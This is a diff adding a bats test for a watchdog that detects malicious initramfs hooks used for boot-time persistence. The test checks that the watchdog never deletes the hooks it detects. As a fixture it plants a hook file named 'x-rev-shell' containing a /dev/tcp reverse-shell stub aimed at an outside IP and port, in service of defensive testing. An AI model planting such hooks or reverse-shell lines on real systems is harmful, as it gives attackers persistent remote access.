@@ -344,3 +344,26 @@ seed_benign() {
     bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
     [ -z "${bad}" ]
 }
+
+@test "INVARIANT (no auto-delete: initramfs-hooks-watchdog NEVER deletes hooks — surveillance not remediation)" {
+    # Sister to brain-wide no-auto-delete / surveillance-not-
+    # remediation INVARIANTs across L2 watchdog suites. The
+    # initramfs-hooks-watchdog DETECTS T1542 Pre-OS Boot
+    # persistence via initramfs hook injection but MUST NEVER
+    # emit rm/unlink commands to auto-remediate. The detected
+    # initramfs hook may also be operator-legitimate (custom
+    # initramfs script for hardware quirk or operator-staged
+    # tooling) — silent auto-delete would destroy operator
+    # baseline state AND destroy forensic evidence chain.
+    # Surveillance, never remediation. Locks anti-data-loss
+    # contract on the initramfs hooks surveillance substrate.
+    seed_benign
+    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/x-rev-shell"
+    chmod 0755 "${HOOKD}/x-rev-shell"
+    run_wd
+    # All hook files MUST remain on disk after detection.
+    [ -f "${HOOKD}/x-rev-shell" ]
+    # Watchdog source must not call rm on hook paths.
+    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
+    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(HOOKD|HOOK)' "${WD}"
+}
